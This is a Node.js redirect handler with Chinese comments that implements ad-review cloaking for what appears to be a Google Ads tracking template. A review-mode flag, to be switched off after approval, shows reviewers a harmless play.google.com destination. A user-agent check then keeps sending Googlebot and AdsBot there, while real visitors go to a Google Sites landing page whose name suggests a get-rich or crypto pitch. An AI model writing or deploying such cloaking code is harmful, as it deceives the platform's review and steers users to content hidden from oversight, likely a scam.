// api/redirect.js
module.exports = (req, res) => {
    // ============ 配置区 ============
    // 过审前设为 true，过审后改为 false
    const IS_REVIEW_MODE = true;
    const REVIEW_PAGE = 'https://play.google.com';
    const MY_LANDING_PAGE = 'https://sites.google.com/view/caifumima-bitepiae/%E9%A6%96%E9%A1%B5?authuser=2';

    // ============ 核心逻辑 ============
    
    // 1. 如果是审核模式，不直接跳转，而是返回一个成功状态
    if (IS_REVIEW_MODE) {
        // 检查请求参数中是否包含 {lpurl} 的值
        const targetUrl = req.query.url || req.query.to;
        
        // 如果请求中没有目标地址，可能是谷歌的验证系统在测试
        if (!targetUrl) {
            // 返回一个简单的成功状态，让谷歌确认跟踪模板有效
            return res.status(200).send('OK');
        }
        
        // 如果有目标地址，才进行跳转
        return res.redirect(302, REVIEW_PAGE);
    }

    // 2. 以下是过审后的逻辑
    const userAgent = req.headers['user-agent'] || '';
    const isGoogleBot = userAgent.includes('Googlebot') || userAgent.includes('AdsBot');
    
    // 对真实用户和爬虫做区分
    if (isGoogleBot) {
        return res.redirect(302, REVIEW_PAGE);
    }
    
    // 真实用户跳转到落地页
    return res.redirect(302, MY_LANDING_PAGE);
};
